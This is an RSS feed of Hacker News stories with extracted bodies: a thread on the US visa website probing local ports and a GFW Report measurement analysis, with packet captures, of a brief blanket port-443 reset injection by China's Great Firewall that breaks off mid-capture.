<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 20 Aug 2025 15:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Show HN: I was curious about spherical helix, ended up making this visualization (152 pts)]]></title>
            <link>https://visualrambling.space/moving-objects-in-3d/</link>
            <guid>44962066</guid>
            <pubDate>Wed, 20 Aug 2025 14:02:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://visualrambling.space/moving-objects-in-3d/">https://visualrambling.space/moving-objects-in-3d/</a>, See on <a href="https://news.ycombinator.com/item?id=44962066">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span>Loading assets, please wait...</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tidewave Web: in-browser coding agent for Rails and Phoenix (192 pts)]]></title>
            <link>https://tidewave.ai/blog/tidewave-web-phoenix-rails</link>
            <guid>44960316</guid>
            <pubDate>Wed, 20 Aug 2025 09:43:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tidewave.ai/blog/tidewave-web-phoenix-rails">https://tidewave.ai/blog/tidewave-web-phoenix-rails</a>, See on <a href="https://news.ycombinator.com/item?id=44960316">Hacker News</a></p>
Couldn't get https://tidewave.ai/blog/tidewave-web-phoenix-rails: Error: getaddrinfo ENOTFOUND tidewave.ai]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Why does the US Visa application website do a port-scan of my network? (378 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=44959073</link>
            <guid>44959073</guid>
            <pubDate>Wed, 20 Aug 2025 06:03:03 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=44959073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><tbody><tr id="44959344"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959344" href="https://news.ycombinator.com/vote?id=44959344&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Visa application is riddled with scams. From the simple website that charges you twice the price to websites that will tell you that you were rejected and then fake your documents to get in with your name.
So they're probably trying to see that you're not one of those web servers, a proxy for them or detect some known C2 channels.</p></div></td></tr></tbody></table></td></tr><tr id="44959572"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959572" href="https://news.ycombinator.com/vote?id=44959572&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Another data point - 5he Indian visa system is similar. The official website ending in .gov.in, which is hard to find, offers a visa for $10 and minimal hassle. The scam websites, with better SEO sell the same shit for $80. They’re just proxying your application to the real website and pocketing the difference.</p><p>It would be good if the Indian government could block the scammers but I guess it’s a lower priority for the moment.</p></div></td></tr></tbody></table></td></tr><tr id="44959821"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959821" href="https://news.ycombinator.com/vote?id=44959821&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>&gt; <i>It would be good if the Indian government could block the scammers</i></p><p>Lead poisoning in South Asia: impact of possibly ~9% of GDP</p><p>&gt; <i>The heart and brain diseases it causes - to which children are especially susceptible - accounted for at least 1.4m deaths in the region in 2019. The economic cost is crippling; that year lead poisoning is estimated to have lowered South Asian productivity by the equivalent of 9% of GDP</i></p><p>important cause of lead poisoning in South Asia: the practice of drugging spices:</p><p>&gt; <i>Lead chromate was added to the turmeric to brighten its golden colour and lead oxide gave the chilli powders a rich red hue</i></p><p>...This (ineffective action to curb the phenomenon of food producers that are mass poisoners, with a priority also equivalent to a staggering slice of GDP) should give you a picture.</p><p>--</p><p><a href="https://www.economist.com/leaders/2023/11/02/how-to-stop-turmeric-from-killing-people" rel="nofollow">https://www.economist.com/leaders/2023/11/02/how-to-stop-tur...</a></p><p><a href="https://www.theguardian.com/global-development/2020/dec/24/dangerous-spices-why-indias-cooking-powders-pose-a-risk-of-lead-poisoning" rel="nofollow">https://www.theguardian.com/global-development/2020/dec/24/d...</a></p></div></td></tr></tbody></table></td></tr><tr id="44959800"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959800" href="https://news.ycombinator.com/vote?id=44959800&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Huh, how do you imagine that would work? This "scan" is happening inside client-side javascript, delivering the file through a proxy wouldn't "detect" anything about the proxy.</p></div></td></tr></tbody></table></td></tr><tr id="44959890"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959890" href="https://news.ycombinator.com/vote?id=44959890&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I imagine it may not be a proxy in the true sense, but a headless browser that's "proxying" the application process rather than the network traffic itself.</p></div></td></tr></tbody></table></td></tr><tr id="44959358"><td></td></tr><tr id="44959648"><td></td></tr><tr id="44959218"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959218" href="https://news.ycombinator.com/vote?id=44959218&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Many sites do it .Included in many standard device fingerprinting / anti anonymity SAAS. Ebay facebook etc all do this ! But it looks this is first party to prevent the adblocking of them</p><p>1MB of obfuscated fingerprinting + portscan  +  Webgl  . But oddity this one is trying to find burp suite specific route's.</p></div></td></tr></tbody></table></td></tr><tr id="44959353"><td></td></tr><tr id="44959862"><td></td></tr><tr id="44959391"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959391" href="https://news.ycombinator.com/vote?id=44959391&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>You should actually harden your browser or PC... to block any unwanted requests. Apparently some browser extensions can do that.</p></div></td></tr></tbody></table></td></tr><tr id="44959494"><td></td></tr><tr id="44959346"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959346" href="https://news.ycombinator.com/vote?id=44959346&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I'm using uMatrix and it blocks by default all connections outside the requested site and parent domains. For example, if I request <a href="https://mail.yahoo.com/" rel="nofollow">https://mail.yahoo.com</a>, connections to yimg.com are blocked. I need to manually allow each CDN for each website, so this attack/profiling won't work.</p><p>Using uMatrix was very annoying at first, most websites are broken without their CDNs, but after a few months or so, the whitelist grew and it contains 90% of websites I visit.</p><p>On my system <a href="https://ceac.state.gov/genniv/" rel="nofollow">https://ceac.state.gov/genniv/</a> tries to connect to captcha.com, google-analytics, googletagmanager, 127.0.0.1 and "burp" (a local hostname that doesn't exist in my network). Interestigly, the browser console doesn't list connection attempts to localhost or burp. If I allow 127.0.0.1 and "tcpdump -i lo", I see connections to port 8888, which isn't open.</p></div></td></tr></tbody></table></td></tr><tr id="44959722"><td></td></tr><tr id="44959870"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959870" href="https://news.ycombinator.com/vote?id=44959870&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I reluctantly switched to only uBo because of uM bugs. But the UI/UX is just a huge step backwards to enable mobile usability.</p></div></td></tr></tbody></table></td></tr><tr id="44959450"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959450" href="https://news.ycombinator.com/vote?id=44959450&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>How does uMatrix handle the Facebook tracking pixel, or the replacement which is the Conversions API Gateway?</p><p>This is a container that FB gives you to host that lives under your domain (it can be your main domain) that slurps up user data and sends it to Facebook from the server side. You embed some JS in your website, and they hoover up the data.</p></div></td></tr></tbody></table></td></tr><tr id="44959727"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959727" href="https://news.ycombinator.com/vote?id=44959727&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>It doesn't handle it. Anyway, there's no way to know what a website does on the server site. Even a completely static website could be sending the server logs somewhere.</p><p>There are options to not load JS, images, XMLHttpRequests, frames, cookies, for each site, but it doesn't list individual files.</p></div></td></tr></tbody></table></td></tr><tr id="44959508"><td></td></tr><tr id="44959362"><td></td></tr><tr id="44959442"><td></td></tr><tr id="44959606"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_44959606" href="https://news.ycombinator.com/vote?id=44959606&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>It seems like they only make the localhost requests on your first visit. If you open devtools in incognito mode (or just clear the cookies) before accessing <a href="https://ceac.state.gov/genniv/" rel="nofollow">https://ceac.state.gov/genniv/</a> you should see those 127.0.0.1 attempts as ERR_CONNECTION_REFUSED in the network tab.</p><p>Somewhat more worryingly, Little Snitch doesn't report them at all, though that might just be because they were already blocked at the browser.</p></div></td></tr></tbody></table></td></tr><tr id="44959595"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959595" href="https://news.ycombinator.com/vote?id=44959595&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>The requests are not made, because some operating systems prevent this.</p><p>If you're on OSX, the permission to "discover on the local network" prevents it from happening ( System Settings -&gt; Privacy &amp; Security -&gt; Local Network -&gt; yourbrowser )</p><p>Could also be 'network' permissions on firefox ( Go to Settings &gt; Privacy &amp; Security &gt; Permissions ) which is on a per site level, but iirc that could be set site-wide at some point.</p><p>The other browsers likely have similar configs, but this is what I have found.</p></div></td></tr></tbody></table></td></tr><tr id="44959516"><td></td></tr><tr id="44959795"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959795" href="https://news.ycombinator.com/vote?id=44959795&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Just a little side note - in this context, it makes sense if the website tries to connect to a local port because you might be running a card reader(ie. terminal). This is how it works with some(all?) EU countries that have a chip in their ID cards, or even vehicle registration cards, which you can use to access sensitive information or perform certain administrative tasks on government websites.</p><p>Although, from personal experience, it used to require java and it worked only on internet explorer and since it has been retired and replaced with chromium, i am not sure what is the way to make it work nowadays, as i have not been able to figure out to use it when i needed the last time.</p></div></td></tr></tbody></table></td></tr><tr id="44959817"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959817" href="https://news.ycombinator.com/vote?id=44959817&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>The "port scan" just seems to be a local connection to 127.0.0.1:8888. I don't know what purpose it serves on this page, but our government websites often use this technique to communicate with native software for digitally signing documents.</p><p>Are you seeing connection attempts to other IPs?</p></div></td></tr></tbody></table></td></tr><tr id="44959318"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959318" href="https://news.ycombinator.com/vote?id=44959318&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>&gt; Blocks malicious websites from port-scanning your computer/network</p><p>How does that work? A browser extension can't influence how your router and other machines in your network react to incoming requests.</p></div></td></tr></tbody></table></td></tr><tr id="44959340"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959340" href="https://news.ycombinator.com/vote?id=44959340&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Judging just from the screenshots, it seems it blocks websites from accessing 127.0.0.1 get requests. Not a port scan to the outside, more of what do you have running on the local machine inside your network.</p></div></td></tr></tbody></table></td></tr><tr id="44959370"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959370" href="https://news.ycombinator.com/vote?id=44959370&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>As far as I understand it, it is supposed to be a scan done by the browser on the user's computer, not an external scan, which a browser extension wouldn't be able to detect.</p></div></td></tr></tbody></table></td></tr><tr id="44959700"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959700" href="https://news.ycombinator.com/vote?id=44959700&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I see. So the website would try to access private IP adresses (RFC 1918) by having elements like &lt;iframe src="<a href="http://10.0.0.1/" rel="nofollow">http://10.0.0.1</a>"&gt; in the web site and then the web site would check if the iframe was loaded successfully?</p></div></td></tr></tbody></table></td></tr><tr id="44959877"><td></td></tr><tr id="44959481"><td></td></tr><tr id="44959329"><td></td></tr><tr id="44959304"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959304" href="https://news.ycombinator.com/vote?id=44959304&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Embarrassed to say that I wasn't aware of this practice. Are there malicious uses for this beyond fingerprinting?</p></div></td></tr></tbody></table></td></tr><tr id="44959317"><td></td></tr><tr id="44959492"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959492" href="https://news.ycombinator.com/vote?id=44959492&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Be careful your security tool isn't producing false positives.</p><p>I remember years back when people would run these firewalls and we'd get complaints from home users about normal traffic.</p><p>Thinks like complaints our mail servers was scanning them on port 25 when they sent email.</p></div></td></tr></tbody></table></td></tr><tr id="44959209"><td></td></tr><tr id="44959381"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959381" href="https://news.ycombinator.com/vote?id=44959381&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Capturing forensic artifacts of the local network allows a building a bridge strategy for identifying fraudulent networks without requiring knowledge of the path taken from destination to recipient. Other local devices do this and send the network map during a phone home, allowing comparison to a source of truth that is tied almost directly to the person, or group of people.</p><p>There is also a lot of fingerprintable material within such a port scan from clock skew, TCP ISN, and a few other areas.</p><p>You can sieve this quite easily with this available, thanks to Roku's, Phone's, and other things doing this while just sitting locally in a shared collision domain (a digital soldier quartered in every home).</p><p>The metadata node graph of devices locally acts as a unique fingerprint once in RFC1918 space, technically not unique but close enough.</p></div></td></tr></tbody></table></td></tr><tr id="44959511"><td></td></tr><tr id="44959289"><td></td></tr><tr id="44959467"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959467" href="https://news.ycombinator.com/vote?id=44959467&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Yeah it should have a fixed header and footer along with a pop-up consent drawer so you can only see 10% of the actual site content.</p><p>So much better.</p><p>Modern web design is a joke.</p></div></td></tr></tbody></table></td></tr><tr id="44959347"><td></td></tr><tr id="44959356"><td></td></tr><tr id="44959694"><td></td></tr></tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Analysis of the GFW's Unconditional Port 443 Block on August 20, 2025 (152 pts)]]></title>
            <link>https://gfw.report/blog/gfw_unconditional_rst_20250820/en/</link>
            <guid>44958621</guid>
            <pubDate>Wed, 20 Aug 2025 04:27:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gfw.report/blog/gfw_unconditional_rst_20250820/en/">https://gfw.report/blog/gfw_unconditional_rst_20250820/en/</a>, See on <a href="https://news.ycombinator.com/item?id=44958621">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

						
						
						
						
						
						

						
						<h2 id="1-introduction">1. Introduction</h2>
<p>Between approximately 00:34 and 01:48 (Beijing Time, UTC+8) on August 20, 2025, the Great Firewall of China (GFW) exhibited anomalous behavior by unconditionally injecting forged TCP <code>RST+ACK</code> packets to disrupt all connections on TCP port 443. This incident caused massive disruption of the Internet connections between China and the rest of the world (<a href="https://t.me/DNSPODT/11175">source1</a> and <a href="https://t.me/zaihuapd/35214">source2</a>).</p>
<p>This report documents our measurements and analysis of this temporary, widespread blocking event. Our primary findings are:</p>
<ol>
<li>The unconditional <code>RST+ACK</code> injections was on TCP port 443, but not on other common ports like 22, 80, 8443.</li>
<li>The unconditional <code>RST+ACK</code> injection disrupted connections both to and from China, but the trigger mechanism was asymmetrical. For traffic originating from inside China, the <code>SYN</code> packet from the client and the <code>SYN+ACK</code> packet could each trigger three injected <code>RST+ACK</code> packets. For traffic to inside China, only the server’s <code>SYN+ACK</code> response, not the client’s <code>SYN</code> packet, could trigger the <code>RST+ACK</code> packets.</li>
<li>The responsible device does not match the fingerprints of any known GFW devices, suggesting that <strong>the incident was caused by either a new GFW device or a known device operating in a novel or misconfigured state</strong>.</li>
</ol>
<p>It is important to note that our analysis was limited by the short duration of the incident (approximately 74 minutes). We encourage others in the community to share their observations to build a more complete picture of this event.</p>
<h2 id="2-triggering-the-blocking">2. Triggering the blocking</h2>
<p>We first confirmed the blocking by sending probes from a vantage points inside of China (AS45090, Tencent Cloud, Beijing), and from multiple vantage points outside of China.</p>
<h3 id="21-inside-out-triggering">2.1 Inside-out triggering</h3>
<p>In particular, we used the following command to try to establish a TCP handshake with a <code>$NON_CN_IP</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>nc -vn $NON_CN_IP <span>443</span>
</span></span><span><span>nc: connect to $NON_CN_IP port <span>443</span> <span>(</span>tcp<span>)</span> failed: Connection refused
</span></span></code></pre></div><p>We simultaneously used <code>tcpdump</code> to capture traffic:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>tcpdump -n host $NON_CN_IP
</span></span></code></pre></div><p>It appears that the <code>SYN</code> packet triggered three forged <code>RST+ACK</code> packets, each with a relative sequence number <code>0</code>, as well as incremental TCP window sizes of <code>1980</code>, <code>1981</code>, and <code>1982</code>.</p>
<p>And the <code>SYN+ACK</code> packet sent by the server also triggered three <code>RST+ACK</code> packets, each with a relative sequence number <code>1</code>, as well as incremental TCP window sizes of <code>3293</code>, <code>3294</code>, and <code>3295</code>.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo tcpdump -n host $NON_CN_IP
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span><span><span>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>01:31:07.153262 IP $CN_IP.52596 &gt; $NON_CN_IP.443: Flags [S], seq 3193349615, win 64240, options [mss 1460,sackOK,TS val 318868316 ecr 0,nop,wscale 7], length 0
</span></span><span><span>01:31:07.159991 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 3193349616, win 1980, length 0
</span></span><span><span>01:31:07.159991 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 1, win 1981, length 0
</span></span><span><span>01:31:07.160021 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 1, win 1982, length 0
</span></span><span><span>01:31:07.274422 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [S.], seq 2837031664, ack 3193349616, win 65160, options [mss 1424,sackOK,TS val 80839422 ecr 318868316,nop,wscale 7], length 0
</span></span><span><span>01:31:07.274442 IP $CN_IP.52596 &gt; $NON_CN_IP.443: Flags [R], seq 3193349616, win 0, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3295, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3293, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3294, length 0
</span></span></code></pre></div><h3 id="22-outside-in-triggering">2.2 Outside-in triggering</h3>
<p>Similarly, the <code>RST+ACK</code> packets can be triggered from outside of China. The <code>$CN_IP</code> is an IP address of <code>baidu.com</code>:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>11:44:41.194853 IP (tos 0x0, ttl 64, id 48747, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    192.168.0.162.34500 &gt; $CN_IP.443: Flags [S], cksum 0x418a (incorrect -&gt; 0x252a), seq 3455861170, win 64240, options [mss 1460,sackOK,TS val 134891089 ecr 0,nop,wscale 7], length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 46, id 48747, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [S.], cksum 0xd4a2 (correct), seq 1580408478, ack 3455861171, win 8192, options [mss 1452,sackOK,nop,nop,nop,nop,nop,nop,nop,nop,nop,nop,nop,wscale 5], length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 96, id 40305, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x515b (correct), seq 1, ack 1, win 2072, length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 97, id 39808, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x515a (correct), seq 1, ack 1, win 2073, length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 98, id 38891, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x5159 (correct), seq 1, ack 1, win 2074, length 0
</span></span><span><span>11:44:41.440901 IP (tos 0x0, ttl 64, id 48748, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    192.168.0.162.34500 &gt; $CN_IP.443: Flags [.], cksum 0x4176 (incorrect -&gt; 0x5781), seq 1, ack 1, win 502, length 0
</span></span></code></pre></div><p>The client outside of China received only three TCP <code>RST+ACK</code> packets, not six. The relative sequence number <code>1</code> suggests that the GFW was triggered by the <code>SYN+ACK</code> packet responded by the Chinese server, and the SYN packet didn’t trigger the blocking. Indeed, we couldn’t trigger the blocking when the sending <code>SYN</code> packets to a Chinese IP address within the same <code>/24</code> subnet as <code>$CN_IP</code> which didn’t have an open port (and thus did not send any <code>SYN+ACK</code> packet back to the client.)</p>
<h3 id="23-affected-ports">2.3 Affected ports</h3>
<p>The <code>RST+ACK</code> injection was confirmed to be specific to TCP port <code>443</code>. We conducted a partial port scan from a machine inside China (AS45090, Tencent Cloud, Beijing) to an external IP address. We confirmed that other common ports, including 1-72, 22, 80, 444, and 8443, were not affected and did not receive a TCP RST.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>nping -4 -c <span>0</span> --tcp-connect $NON_CN_IP -p 1-65535
</span></span></code></pre></div><p>We also ran a scan to probe all ports from 1-65535, but by the time we ran it at 01:48 CST 2025-08-20, we could no longer trigger the blocking anymore:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo nmap -sS -p- $NON_CN_IP -oN scan_results.txt -T4 --min-rate <span>10000</span> -Pn
</span></span></code></pre></div><h2 id="3-attribution-and-device-fingerprinting">3. Attribution and Device Fingerprinting</h2>
<p>The Great Firewall of China (GFW) is not a single entity but a complex system composed of various network devices that perform censorship. Previous research has established that different components, such as those responsible for HTTP Host-based and TLS SNI-based filtering, exhibit unique packet-level fingerprints when injecting TCP RST packets. The goal of this analysis was to identify which specific GFW component was responsible for the anomalous behavior observed during the incident.</p>
<p>To fingerprint the responsible device, after the incident had concluded, we sent probes from the vantage point in China to the IP address that triggered the unconditional RSTs. We used the same destination IP address so that our probe packets would be more likely to traverse the same network path and interact with the same set of censorship middleboxes, allowing for a consistent fingerprint analysis.</p>
<p>Our analysis of the probe results revealed that <strong>no captured packet fingerprint exactly matched the characteristics observed during the incident—specifically</strong>.</p>
<p>Since the unconditionally injection contain three RST+ACK packets with the IP Flag <code>DF</code> (<code>Don't Fragment</code>) on, they are similar, but not identical, to <code>MB-1</code> identified by Niere et al. (see <a href="https://censorbib.nymity.ch/pdf/Niere2025a.pdf#page=8">Figure 4</a>); and they are also similar to, but not identical to, <code>GFW (II)</code> identified by Wu et al. (see <a href="https://gfw.report/publications/sp25/en/#tbl:4-injection-behaviors-packet-fingerprints">Table 4</a>).</p>
<p>However, a key difference exists: the known middlebox injector sends three <strong>identical</strong> TCP <code>RST+ACK</code> packets. In contrast, the packets observed during this incident contained fields that were clearly incremental, not identical. This discrepancy suggests that <strong>the incident was caused by either a previously uncatalogued GFW device or a known device operating in a novel or misconfigured state.</strong></p>
<h3 id="31-fingerprints-of-gfws-unconditional-rstack-packets">3.1 Fingerprints of GFW’s Unconditional RST+ACK packets</h3>
<p>The unconditional RST+ACK packets comes in three packets, with an incrementally increasing IP TTL and an incrementally increasing TCP window size. We limited data, we were not able to identify the IP ID of it.</p>
<table>
  <thead>
      <tr>
          <th>IP Flag</th>
          <th>IP ID</th>
          <th>IP TTL</th>
          <th>TCP Relative Sequence Number</th>
          <th>TCP Flags</th>
          <th>TCP Window Size</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Don’t Fragment</td>
          <td>40305 (0x9D71)</td>
          <td>96</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2072</td>
      </tr>
      <tr>
          <td>Don’t Fragment</td>
          <td>39808 (0x9B80)</td>
          <td>97</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2073</td>
      </tr>
      <tr>
          <td>Don’t Fragment</td>
          <td>38891 (0x97E3)</td>
          <td>98</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2074</td>
      </tr>
  </tbody>
</table>
<p><em>Table 1: Characteristics of Unconditionally Injected TCP RST Packets</em></p>
<h3 id="32-fingerprints-of-the-rst-packets-by-gfws-http-host-based-censorship-devices">3.2 Fingerprints of the RST packets by GFW’s HTTP Host-based censorship devices</h3>
<div><pre tabindex="0"><code data-lang="sh"><span><span>curl --resolve youtube.com:80:$NON_CN_IP http://youtube.com
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>04:27:09.790274 IP (tos 0x0, ttl 64, id 12103, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    $CN_IP.51506 &gt; $NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [S], cksum 0x630f (correct), seq 3187873750, win 64240, options [mss 1460,sackOK,TS val 329430953 ecr 0,nop,wscale 7], length 0
</span></span><span><span>04:27:09.919296 IP (tos 0x68, ttl 251, id 0, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [S.], cksum 0xaf88 (correct), seq 155578285, ack 3187873751, win 65160, options [mss 1424,sackOK,TS val 2237542832 ecr 329430953,nop,wscale 7], length 0
</span></span><span><span>04:27:09.919331 IP (tos 0x0, ttl 64, id 12104, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [.], cksum 0xda42 (correct), ack 1, win 502, options [nop,nop,TS val 329431082 ecr 2237542832], length 0
</span></span><span><span>04:27:09.919414 IP (tos 0x0, ttl 64, id 12105, offset 0, flags [DF], proto TCP (6), length 127)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [P.], cksum 0x0926 (correct), seq 1:76, ack 1, win 502, options [nop,nop,TS val 329431082 ecr 2237542832], length 75: HTTP, length: 75
</span></span><span><span>        GET / HTTP/1.1
</span></span><span><span>        Host: youtube.com
</span></span><span><span>        User-Agent: curl/7.81.0
</span></span><span><span>        Accept: */*
</span></span><span><span>
</span></span><span><span>04:27:09.923159 IP (tos 0x68, ttl 251, id 31725, offset 0, flags [none], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R], cksum 0xc7c6 (correct), seq 155578286, win 42571, length 0
</span></span><span><span>04:27:09.924494 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:09.924494 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
